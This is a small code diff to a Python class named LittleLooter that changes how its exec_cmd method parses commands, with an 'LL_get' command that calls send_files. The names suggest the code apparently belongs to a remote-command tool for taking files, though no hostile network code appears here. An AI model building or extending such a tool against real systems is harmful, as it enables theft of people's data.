@@ -44,8 +44,8 @@ class LittleLooter:
     def execute(self) -> None:
         pass
 
-    def exec_cmd(self, cmd: dict) -> None:
-        match cmd["cmd"]:
+    def exec_cmd(self, cmd: list) -> None:
+        match cmd[0]:
             case "LL_get":
                 self.send_files()
         
